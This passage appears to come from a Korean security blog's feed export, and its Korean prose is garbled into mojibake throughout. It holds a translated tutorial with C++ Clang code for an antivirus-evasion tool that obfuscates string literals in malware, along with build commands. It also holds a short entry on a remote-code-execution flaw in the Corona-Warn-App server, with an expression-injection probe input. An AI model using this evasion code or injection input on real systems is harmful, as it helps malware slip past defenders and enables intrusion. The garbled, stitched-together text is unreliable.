class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Basic/SourceManager.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchers.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchFinder.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Type.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Decl.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTContext.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTConsumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MatchHandler.h&quot;</span></span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MatchHandler</span> :</span> <span class="hljs-keyword">public</span> clang::ast_matchers::MatchFinder::MatchCallback &#123;<span class="hljs-keyword">public</span>:    <span class="hljs-keyword">using</span> MatchResult = clang::ast_matchers::MatchFinder::MatchResult;    MatchHandler(clang::Rewriter *rewriter);    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> <span class="hljs-keyword">override</span></span>; <span class="hljs-comment">// callback function that runs whenever a Match is found.</span>&#125;;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">//AVCLEANER_MATCHHANDLER_H</span></span></code></pre><p><code>MatchHandler.cpp</code>ì—ì„œ <code>MatchHandler</code>ì˜ ìƒì„±ìì™€ <code>run</code> ì½œë°± í•¨ìˆ˜ë¥¼ êµ¬í˜„í•´ì•¼ í•œë‹¤. <code>MatchHandler</code>ì˜ ìƒì„±ìëŠ” ë‚˜ì¤‘ì— ì‚¬ìš©í•  <code>clang::Rewriter</code>ì˜ instanceë§Œ ì €ì¥í•˜ë©´ ë˜ë¯€ë¡œ ê°„ë‹¨í•˜ë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang;MatchHandler::MatchHandler(clang::Rewriter *rewriter) &#123;    <span class="hljs-keyword">this</span>-&gt;ASTRewriter = rewriter;&#125;</code></pre><p><code>run</code>ì˜ êµ¬í˜„ì€ ì•„ë˜ì™€ ê°™ë‹¤:</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> </span>&#123;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *Decl = Result.Nodes.getNodeAs&lt;clang::StringLiteral&gt;(<span class="hljs-string">&quot;decl&quot;</span>);    clang::SourceManager &amp;SM = ASTRewriter-&gt;getSourceMgr();    <span class="hljs-comment">// skip strings in included headers</span>    <span class="hljs-keyword">if</span> (!SM.isInMainFile(Decl-&gt;getBeginLoc()))        <span class="hljs-keyword">return</span>;    <span class="hljs-comment">// strings that comprise less than 5 characters are not worth the effort</span>    <span class="hljs-keyword">if</span> (!Decl-&gt;getBytes().str().size() &gt; <span class="hljs-number">4</span>) &#123;        <span class="hljs-keyword">return</span>;    &#125;    climbParentsIgnoreCast(*Decl, clang::ast_type_traits::DynTypedNode(), Result.Context, <span class="hljs-number">0</span>);&#125;</code></pre><p>ìœ„ì—ì„œ ì§šê³  ë„˜ì–´ê°ˆ ì„¸ ê°€ì§€ê°€ ìˆë‹¤:</p><ul><li><code>StringEncryptionConsumer</code>ì—ì„œ ì •ì˜ëœ íŒ¨í„´ê³¼ ì¼ì¹˜í•˜ëŠ” AST ë…¸ë“œë¥¼ ì¶”ì¶œí•œë‹¤. ê·¸ëŸ¬ê¸° ìœ„í•´ì„œ ë°”ì¸ë”©ëœ íŒ¨í„´ identifierë¥¼ ì¸ìë¡œ ë¬¸ìì—´ì„ ì˜ˆìƒí•˜ëŠ” <code>getNodeAs</code>ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆë‹¤.(<code>const auto Matcher = stringLiteral().bind(&quot;decl&quot;)</code>)</li><li>ë¶„ì„ ì¤‘ì¸ translation unitì—ì„œ ì •ì˜ë˜ì§€ ì•Šì€ ë¬¸ìì—´ì€ ë„˜ì–´ê°„ë‹¤. ì‹¤ì œ ìš°ë¦¬ê°€ ë§Œë“  passëŠ” ì‹œìŠ¤í…œ í—¤ë”ë¥¼ translation unitì— ë³µì‚¬í•˜ëŠ” <em>Clang</em>ì˜ ì „ì²˜ë¦¬ê¸° ì´í›„ì— ì‹¤í–‰ëœë‹¤.</li><li>ì´ì œ ë¬¸ìì—´ ë¦¬í„°ëŸ´ì„ ì²˜ë¦¬í•  ì¤€ë¹„ê°€ ëë‹¤. ë¬¸ìì—´ ë¦¬í„°ëŸ´ì´ ì–´ë–¤ contextì—ì„œ ë°œê²¬ëëŠ”ì§€ ì•Œì•„ì•¼ í•˜ë¯€ë¡œ ì‚¬ìš©ì ì •ì˜ í•¨ìˆ˜ì—ì„œ ì¶”ì¶œëœ ë…¸ë“œ(ìœ„ì˜ ê²½ìš° <code>climbParentsIgnoreCase</code>)ë¥¼ ASTì— ëŒ€í•œ ì°¸ì¡°ë¥¼ í¬í•¨í•œ <code>Result.Context</code>ë¥¼ í†µí•´ ì „ë‹¬í•œë‹¤. ëª©í‘œëŠ” í¥ë¯¸ë¡œìš´ ë…¸ë“œë¥¼ ì°¾ì„ ë•Œê¹Œì§€ ìœ„ìª½ì˜ íŠ¸ë¦¬ë¥¼ íƒìƒ‰í•˜ëŠ” ê²ƒì´ë‹¤. ì´ ê²½ìš°ì—ì„œ í¥ë¯¸ë¡œìš´ ë…¸ë“œëŠ” <code>CallExpr</code> íƒ€ì…ì´ë‹¤.</li></ul><pre><code class="hljs cpp"><span class="hljs-keyword">bool</span>MatchHandler::climbParentsIgnoreCast(<span class="hljs-keyword">const</span> StringLiteral &amp;NodeString, clang::ast_type_traits::DynTypedNode node,                                     clang::ASTContext *<span class="hljs-keyword">const</span> pContext, <span class="hljs-keyword">uint64_t</span> iterations) &#123;    ASTContext::DynTypedNodeList parents = pContext-&gt;getParents(NodeString);    <span class="hljs-keyword">if</span> (iterations &gt; <span class="hljs-number">0</span>) &#123;        parents = pContext-&gt;getParents(node);    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> &amp;parent : parents) &#123;        StringRef ParentNodeKind = parent.getNodeKind().asStringRef();        <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;Cast&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">return</span> climbParentsIgnoreCast(NodeString, parent, pContext, ++iterations);        &#125;        handleStringInContext(&amp;NodeString, pContext, parent);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>ê°„ë‹¨íˆ ë§í•´ì„œ ì´ í•¨ìˆ˜ëŠ” í¥ë¯¸ë¡œìš´ ê²ƒ(â€œCastâ€ê°€ ì•„ë‹Œ ê²ƒ)ì„ ì°¾ì„ ë•Œ ê¹Œì§€ <code>StringLiteral</code> ë…¸ë“œì˜ ë¶€ëª¨ ë…¸ë“œë“¤ì„ ì¬ê·€ì ìœ¼ë¡œ íƒìƒ‰í•œë‹¤. <code>handleStringInContext</code>ëŠ” ë³µì¡í•˜ì§€ ì•Šë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleStringInContext</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                         <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    StringRef ParentNodeKind = node.getNodeKind().asStringRef();    <span class="hljs-keyword">if</span> (ParentNodeKind.compare(<span class="hljs-string">&quot;CallExpr&quot;</span>) == <span class="hljs-number">0</span>) &#123;        handleCallExpr(pLiteral, pContext, node);    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ParentNodeKind.compare(<span class="hljs-string">&quot;InitListExpr&quot;</span>) == <span class="hljs-number">0</span>) &#123;        handleInitListExpr(pLiteral, pContext, node);    &#125; <span class="hljs-keyword">else</span> &#123;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Unhandled context &quot;</span> &lt;&lt; ParentNodeKind &lt;&lt; <span class="hljs-string">&quot; for string &quot;</span> &lt;&lt; pLiteral-&gt;getBytes() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    &#125;&#125;</code></pre><p>ìœ„ ì½”ë“œì—ì„œ ëˆˆì— ë„ëŠ” ê±´ ì‹¤ì œë¡œ ì²˜ë¦¬ë˜ëŠ” ë…¸ë“œê°€ ë‘ ì¢…ë¥˜ì¸ ê²ƒì´ë‹¤. ë˜í•œ í•„ìš”í•  ë•Œ ì¶”ê°€í•˜ëŠ” ê²Œ ì‰¬ì›Œì•¼ í•œë‹¤. ì‹¤ì œë¡œ ë‘ ê²½ìš° ì´ë¯¸ ë¹„ìŠ·í•˜ê²Œ ì²˜ë¦¬ë˜ê³  ìˆë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                  <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *FunctionCall = node.get&lt;clang::CallExpr&gt;();    <span class="hljs-keyword">if</span> (isBlacklistedFunction(FunctionCall)) &#123;        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// exclude printf-like functions when the replacement is not constant anymore (C89 standard...).</span>    &#125;    handleExpr(pLiteral, pContext, node);&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleInitListExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                      <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    handleExpr(pLiteral, pContext, node);&#125;</code></pre><h3 id="ë¬¸ìì—´-ë¦¬í„°ëŸ´-êµì²´"><a href="#ë¬¸ìì—´-ë¦¬í„°ëŸ´-êµì²´" class="headerlink" title="ë¬¸ìì—´ ë¦¬í„°ëŸ´ êµì²´"></a>ë¬¸ìì—´ ë¦¬í„°ëŸ´ êµì²´</h3><p><a href="https://clang.llvm.org/doxygen/classclang_1_1CallExpr.html"><code>CallExpr</code></a>ê³¼ <a href="https://clang.llvm.org/doxygen/classclang_1_1InitListExpr.html"><code>InitListExpr</code></a>ì€ ë¹„ìŠ·í•˜ê²Œ ì²˜ë¦¬ë˜ë¯€ë¡œ ë‘˜ ë‹¤ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ê³µí†µì ì¸ í•¨ìˆ˜ë¥¼ ì •ì˜í•œë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">MatchHandler::handleExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                  <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    clang::SourceRange LiteralRange = clang::SourceRange(            ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getBeginLoc()),            ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getEndLoc())    );    <span class="hljs-keyword">if</span>(shouldAbort(pLiteral, pContext, LiteralRange))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Replacement = translateStringToIdentifier(pLiteral-&gt;getBytes().str());    <span class="hljs-keyword">if</span>(!insertVariableDeclaration(pLiteral, pContext, LiteralRange, Replacement))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> ;    Globs::PatchedSourceLocation.push_back(LiteralRange);    <span class="hljs-keyword">return</span> replaceStringLiteral(pLiteral, pContext, LiteralRange, Replacement);&#125;</code></pre><ul><li>ë³€ìˆ˜ëª…ì„ ë¬´ì‘ìœ„ë¡œ ìƒì„±í•œë‹¤.</li><li>ê°€ê¹Œìš´ ìœ„ì¹˜ì—ì„œ ë¹ˆ ê³µê°„ì„ ì°¾ê³  ë³€ìˆ˜ ì„ ì–¸ì„ ì‚½ì…í•´ë¼. ì´ê²ƒì€ ê¸°ë³¸ì ìœ¼ë¡œ <code>ASTRewriterâ†’InsertText()</code>ë¥¼ ë‘˜ëŸ¬ì‹¼ wrapperì´ë‹¤.</li><li>1ë‹¨ê³„ì—ì„œ ìƒì„±ëœ identifierë¥¼ ê°€ì§„ ë¬¸ìì—´ì„ ë°”ê¾¼ë‹¤.</li><li>collectionì— ë¬¸ìì—´ ë¦¬í„°ëŸ´ì˜ ìœ„ì¹˜ë¥¼ ì¶”ê°€í•œë‹¤. ì´ëŠ” <code>InitListExpr</code>ë¥¼ ì§€ë‚  ë•Œ ê°™ì€ ë¬¸ìì—´ ë¦¬í„°ëŸ´ì„ ë‘ ë²ˆ í‘œì‹œí•´ì£¼ë¯€ë¡œ ìœ ìš©í•˜ë‹¤.(ì´ìœ ëŠ” ì•Œ ìˆ˜ ì—†ë‹¤).</li></ul><p>ë§ˆì§€ë§‰ ë‹¨ê³„ëŠ” ì‹¤ì œ êµ¬í˜„ì´ ì–´ë µê¸° ë•Œë¬¸ì— ë¨¼ì € ë³´ì.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">MatchHandler::replaceStringLiteral</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                        clang::SourceRange LiteralRange,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; Replacement)</span> </span>&#123;    <span class="hljs-comment">// handle &quot;TEXT&quot; macro argument, for instance LoadLibrary(TEXT(&quot;ntdll&quot;));</span>    <span class="hljs-keyword">bool</span> isMacro = ASTRewriter-&gt;getSourceMgr().isMacroBodyExpansion(pLiteral-&gt;getBeginLoc());    <span class="hljs-keyword">if</span> (isMacro) &#123;        StringRef OrigText = clang::Lexer::getSourceText(CharSourceRange(pLiteral-&gt;getSourceRange(), <span class="hljs-literal">true</span>),                                                         pContext-&gt;getSourceManager(), pContext-&gt;getLangOpts());        <span class="hljs-comment">// weird bug with TEXT Macro / other macros...there must be a proper way to do this.</span>        <span class="hljs-keyword">if</span> (OrigText.find(<span class="hljs-string">&quot;TEXT&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            ASTRewriter-&gt;RemoveText(LiteralRange);            LiteralRange.setEnd(ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getEndLoc().getLocWithOffset(<span class="hljs-number">-1</span>)));        &#125;    &#125;    <span class="hljs-keyword">return</span> ASTRewriter-&gt;ReplaceText(LiteralRange, Replacement);&#125;</code></pre><p>ë³´í†µ í…ìŠ¤íŠ¸ êµì²´ëŠ” <code>ReplaceText</code> APIë¥¼ ì“°ì§€ë§Œ ë§ì€ ë²„ê·¸ê°€ ë°œìƒí–ˆë‹¤. ë§¤í¬ë¡œì˜ ê²½ìš° Clangì˜ APIëŠ” ë¶ˆê·œì¹™í•˜ê²Œ ë™ì‘í•˜ì—¬ ë³µì¡í•˜ë‹¤. ì˜ˆë¥¼ ë“¤ì–´ <code>isMacroBodyExpansion()</code>ì„ í†µí•œ í™•ì¸ì´ ì—†ìœ¼ë©´ ì¸ìê°€ ì•„ë‹ˆë¼ <code>&quot;TEXT&quot;</code>ê°€ êµì²´ëœë‹¤. <code>LoadLibrary(TEXT(&quot;ntdll&quot;))</code>ì—ì„œ<code>LoadLibrary(your_variable(&quot;ntdll&quot;))</code>ë¡œ ì˜ëª» êµì²´ë˜ëŠ” ê²ƒì´ë‹¤.</p><p>ì´ìœ ëŠ” <code>&quot;TEXT&quot;</code>ê°€ <em>Clang</em>ì˜ ì „ì²˜ë¦¬ê¸°ì— ì˜í•´ ì²˜ë¦¬ë  ë•Œ <code>L&quot;ntdll&quot;</code>ì„ êµì²´í•˜ëŠ” ë§¤í¬ë¡œì´ê¸° ë•Œë¬¸ì´ë‹¤. transformation passëŠ” ì „ì²˜ë¦¬ê¸° ì‘ì—…ì´ ì™„ë£Œëœ í›„ ë°œìƒí•˜ë¯€ë¡œ <code>&quot;ntdll&quot;</code>ì˜ ì‹œì‘ê³¼ ë ìœ„ì¹˜ë¥¼ ì¿¼ë¦¬ í•˜ëŠ” ê²ƒì€ ëª‡ ê¸€ìê°€ ë¹ ì§„ ì˜ëª»ëœ ê°’ì´ ë‚˜ì˜¬ ìˆ˜ ìˆì–´ì„œ ìœ ìš©í•˜ì§€ ì•Šë‹¤. ë¶ˆí–‰í•˜ê²Œë„ ê¸°ì¡´ translation unitì— ì‹¤ì œ ìœ„ì¹˜ë¥¼ ì¿¼ë¦¬í•˜ëŠ” ê²ƒì€ Clang APIë¥¼ ì´ìš©í•˜ì˜€ê³  ì‹œí–‰ì°©ì˜¤ë¥¼ ê±°ì³ì„œ í•´ê²° ë°©ë²•ì„ ì°¾ì•˜ë‹¤.</p><h3 id="ì¸ì ‘í•œ-ë¹ˆ-ê³µê°„ì—-ë³€ìˆ˜-ì„ ì–¸-ì‚½ì…"><a href="#ì¸ì ‘í•œ-ë¹ˆ-ê³µê°„ì—-ë³€ìˆ˜-ì„ ì–¸-ì‚½ì…" class="headerlink" title="ì¸ì ‘í•œ ë¹ˆ ê³µê°„ì— ë³€ìˆ˜ ì„ ì–¸ ì‚½ì…"></a>ì¸ì ‘í•œ ë¹ˆ ê³µê°„ì— ë³€ìˆ˜ ì„ ì–¸ ì‚½ì…</h3><p>ì´ì œ ë¬¸ìì—´ ë¦¬í„°ëŸ´ì„ ë³€ìˆ˜ identifierë¡œ ë°”ê¿€ ìˆ˜ ìˆìœ¼ë‹ˆ ë³€ìˆ˜ë¥¼ ì •ì˜í•˜ê³  ì›ë˜ ë¬¸ìì—´ë¡œ í• ë‹¹í•´ì•¼ í•œë‹¤. íŒ¨ì¹˜ëœ ì†ŒìŠ¤ ì½”ë“œì— ì•„ë¬´ê²ƒë„ ë®ì–´ì“°ì§€ ì•Šê³  <code>char your_variable[] = &quot;ntdll&quot;</code>ì„ í•´ì•¼ í•œë‹¤.</p><p>ë‘ ê°€ì§€ ì‹œë‚˜ë¦¬ì˜¤ê°€ ìˆë‹¤:</p><ul><li>ë¬¸ìì—´ ë¦¬í„°ëŸ´ì´ í•¨ìˆ˜ ë°”ë”” ì•ˆì— ìœ„ì¹˜í•œë‹¤.</li><li>ë¬¸ìì—´ ë¦¬í„°ëŸ´ì´ í•¨ìˆ˜ ë°”ë”” ë°–ì— ìœ„ì¹˜í•œë‹¤.</li></ul><p>í›„ìëŠ” ë¬¸ìì—´ ë¦¬í„°ëŸ´ì´ ì‚¬ìš©ë˜ëŠ” í‘œí˜„ì‹ì˜ ì‹œì‘ ë¶€ë¶„ì„ ì°¾ìœ¼ë©´ ë¼ì„œ ê°€ì¥ ê°„ë‹¨í•˜ë‹¤.</p><p>ì „ìëŠ” í¬í•¨ëœ í•¨ìˆ˜ë¥¼ ì°¾ì•„ì•¼ í•œë‹¤. ê·¸ í›„ Clangì€ APIë¡œ í•¨ìˆ˜ ë°”ë””ì˜ ì‹œì‘ ìœ„ì¹˜ë¥¼ ì¿¼ë¦¬ í•œë‹¤. ë³€ìˆ˜ê°€ ì „ì²´ í•¨ìˆ˜ì—ì„œ ë³¼ ìˆ˜ ìˆê³  ìš°ë¦¬ê°€ ì‚½ì…í•œ í† í°ì´ ë‚´ìš©ì„ ë®ì–´ ì”Œìš°ì§€ ì•Šìœ¼ë¯€ë¡œ ë³€ìˆ˜ ì„ ì–¸ì„ ì‚½ì…í•  ê³µê°„ìœ¼ë¡œ ì´ìƒì ì´ë‹¤.</p><p>ì–´ë–¤ ê²½ìš°ë“  ë‘ ê°€ì§€ ìƒí™©ì€ <code>FunctionDecl</code> í˜¹ì€ <code>VarDecl</code> íƒ€ì…ì˜ ë…¸ë“œê°€ ë°œê²¬ë  ë•Œê¹Œì§€ ëª¨ë“  ë¶€ëª¨ ë…¸ë“œë¥¼ ë°©ë¬¸í•´ì„œ í•´ê²°í•œë‹¤.</p><pre><code class="hljs cpp">MatchHandler::findInjectionSpot(clang::ASTContext *<span class="hljs-keyword">const</span> Context, clang::ast_type_traits::DynTypedNode Parent,                                <span class="hljs-keyword">const</span> clang::StringLiteral &amp;Literal, <span class="hljs-keyword">bool</span> IsGlobal, <span class="hljs-keyword">uint64_t</span> Iterations) &#123;    <span class="hljs-keyword">if</span> (Iterations &gt; CLIMB_PARENTS_MAX_ITER)        <span class="hljs-keyword">throw</span> <span class="hljs-built_in">std</span>::runtime_error(<span class="hljs-string">&quot;Reached max iterations when trying to find a function declaration&quot;</span>);    ASTContext::DynTypedNodeList parents = Context-&gt;getParents(Literal);;    <span class="hljs-keyword">if</span> (Iterations &gt; <span class="hljs-number">0</span>) &#123;        parents = Context-&gt;getParents(Parent);    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> &amp;parent : parents) &#123;        StringRef ParentNodeKind = parent.getNodeKind().asStringRef();        <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;FunctionDecl&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">auto</span> FunDecl = parent.get&lt;clang::FunctionDecl&gt;();            <span class="hljs-keyword">auto</span> *Statement = FunDecl-&gt;getBody();            <span class="hljs-keyword">auto</span> *FirstChild = *Statement-&gt;child_begin();            <span class="hljs-keyword">return</span> &#123;FirstChild-&gt;getBeginLoc(), FunDecl-&gt;getEndLoc()&#125;;        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;VarDecl&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">if</span> (IsGlobal) &#123;                <span class="hljs-keyword">return</span> parent.get&lt;clang::VarDecl&gt;()-&gt;getSourceRange();            &#125;        &#125;        <span class="hljs-keyword">return</span> findInjectionSpot(Context, parent, Literal, IsGlobal, ++Iterations);    &#125;&#125;</code></pre><h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><pre><code class="hljs cpp">git clone https:<span class="hljs-comment">//github.com/SCRT/avcleaner</span>mkdir avcleaner/CMakeBuild &amp;&amp; cd avcleaner/CMakeBuildcmake ..makecd ..bash run_example.sh test/string_simplest.c</code></pre><p><img src="/2020/11/22/idioth/av_evasion_part1/4.png"></p><p>ë³´ë‹¤ì‹œí”¼ ì˜ ë™ì‘í•œë‹¤. ì§€ê¸ˆ ì´ ì˜ˆì œëŠ” ì •ê·œì‹ìœ¼ë¡œ í•´ê²°í•  ë§Œí¼ ì½”ë“œê°€ ì§§ë‹¤. </p><h2 id="Going-further"><a href="#Going-further" class="headerlink" title="Going further"></a>Going further</h2><p>ì§€ê¸ˆì€ obfuscation passì˜ ì´ë¦„ì´ <code>StringEncryptor</code>ì´ì§€ë§Œ ì‹¤ì œë¡œ ë¬¸ìì—´ì´ ì•”í˜¸í™”ë˜ì§€ ì•ŠëŠ”ë‹¤. ë¬¸ìì—´ì„ ì•”í˜¸í™”í•˜ë ¤ë©´ ì–¼ë§ˆë‚˜ ë§ì€ ë…¸ë ¥ì´ í•„ìš”í• ê¹Œ?</p><h3 id="To-be-continuedâ€¦"><a href="#To-be-continuedâ€¦" class="headerlink" title="To be continuedâ€¦"></a>To be continuedâ€¦</h3><p>ë¬¸ìì—´ì„ ë‚œë…í™”í•˜ëŠ” ê²ƒì€ ì‰¬ìš´ ë¶€ë¶„ì´ì§€ë§Œ Clang APIì— ìµìˆ™í•´ì•¼ í•œë‹¤. ì†ŒìŠ¤ ì½”ë“œ ë¬¸ì„œë¥¼ ë³´ëŠ”ë° 1~2ì£¼ ì •ë„ ì“°ëŠ” ê²ƒì„ ì¶”ì²œí•œë‹¤.</p><p>ë‹¤ìŒ íŒŒíŠ¸ì—ì„œëŠ” ìë™ìœ¼ë¡œ API importë¥¼ ìˆ¨ê¸°ëŠ” ê²ƒì— ëŒ€í•´ ë‹¤ë£° ê²ƒì´ë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>bypass</tag>
      
      <tag>evasion</tag>
      
      <tag>meterpreter</tag>
      
      <tag>obfuscation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] German Corona-Warn-App sever RCE</title>
    <link href="/2020/11/21/fabu1ous/2020-11-21/"/>
    <url>/2020/11/21/fabu1ous/2020-11-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/research/securing-the-fight-against-covid19-through-oss">Securing the fight against COVID-19</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Corona-Warn-App(contect tracking infrastructure of Germany)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Corona-Warn-App(ì´í•˜ CWA)ì€ ë…ì¼ì˜ ì ‘ì´‰ì ê¸°ë¡/ì¶”ì  ì¸í”„ë¼ì…ë‹ˆë‹¤. ì´ ì•±ì´ ì„¤ì¹˜ëœ ìŠ¤ë§ˆíŠ¸í°ì€ ë¸”ë£¨íˆ¬ìŠ¤ë¡œ ì‹ë³„ payloadë¥¼ ë¸Œë¡œë“œì¼€ìŠ¤íŠ¸í•˜ê³ , ë¸”ë£¨íˆ¬ìŠ¤ì˜ ì‹ í˜¸ ë²”ìœ„ ë‚´ì— ë“¤ì–´ì˜¨ ë‹¤ë¥¸ ë””ë°”ì´ìŠ¤ë“¤ì´ ì´ payloadì™€ payloadë¥¼ ë°›ì€ ì‹œê°ì„ 2ì£¼ê°„ ì €ì¥í•©ë‹ˆë‹¤. ì–‘ì„± íŒì •ì„ ë°›ì€ ì‚¬ìš©ìëŠ” ê²€ì‚¬ ê²°ê³¼ì™€ ì´ì— ëŒ€í•œ í‚¤ê°’(Diagnosis key)ì„ CWA serverì— ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>CWA ì„œë²„ëŠ” Spring boot í”„ë ˆì„ì›Œí¬ë¡œ ë™ì‘í•˜ë©° Diagnosis keyë¥¼ ë°›ì•„ ì²˜ë¦¬í•˜ëŠ” ê³¼ì •ì—ì„œ <a href="https://securitylab.github.com/research/bean-validation-RCE">Java Bean Validation</a> ì·¨ì•½ì ì´ ì¡´ì¬í•©ë‹ˆë‹¤. </p><p>Spring boot appì´ ì…ë ¥ë°›ì€ ê°ì²´ë¥¼ validate í•œë‹¤ëŠ” ê²ƒì€ ê·¸ ê°ì²´ê°€ constraint ì¡°ê±´ì— ë§Œì¡±í•˜ëŠ”ì§€ í™•ì¸í•˜ëŠ” ë™ì‘ì„ ëœ»í•©ë‹ˆë‹¤. constraint ì¡°ê±´ì€ â€˜@â€™ë¥¼ í†µí•´ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Input</span> </span>&#123;  <span class="hljs-meta">@Min(1)</span>  <span class="hljs-meta">@Max(10)</span>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> num;    <span class="hljs-comment">//...</span>&#125;</code></pre><p>intí˜• numì˜ ìµœì†Ÿê°’ì´ 1, ìµœëŒ“ê°’ì´ 10ì¸ constraint ì¡°ê±´ì´ ê±¸ë ¤ìˆëŠ” ì½”ë“œì…ë‹ˆë‹¤. <code>@Min()</code>ì´ë‚˜ <code>@Max()</code>ì²˜ëŸ¼ built-in ì¡°ê±´ë§Œ ìˆëŠ” ê²ƒì´ ì•„ë‹ˆë¼ custom constraint ë˜í•œ ì¡´ì¬í•˜ê³ , ì´ë¥¼ ì´ìš©í•œ validationì„ custom constraint validationì´ë¼ ë¶€ë¦…ë‹ˆë‹¤.</p><pre><code class="hljs powershell">input : ab<span class="hljs-variable">$</span>&#123;<span class="hljs-number">12</span>*<span class="hljs-number">12</span>&#125;<span class="hljs-built_in">cd</span>output : ab144<span 